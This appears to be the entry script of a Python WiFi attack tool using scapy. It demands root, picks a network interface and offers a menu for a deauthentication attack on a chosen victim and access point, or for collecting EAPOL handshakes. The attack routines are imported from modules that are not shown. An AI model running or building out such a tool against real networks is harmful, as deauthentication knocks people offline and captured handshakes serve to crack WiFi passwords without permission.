
import os, sys
from scapy.all import conf
from def_chkIface import chkIface
from def_chkAtkAddr import chkAtkAddr
from def_atkDeauth import atkDeauth
from def_collEapol import collEapol

if os.geteuid() != 0:
    sys.exit("Only root can run this script.")

conf.iface = chkIface()
print('1. DeAuth Attack')
print('2. EAPOL Collect')
print('')
print('[Your Interface : '+conf.iface+']')
print('')

choice = input('Choose option : ')
if choice == '1':
    vicAddr, bssAddr = chkAtkAddr()
    atkDeauth(vicAddr, bssAddr)
elif choice == '2':
    collEapol()


print('exit')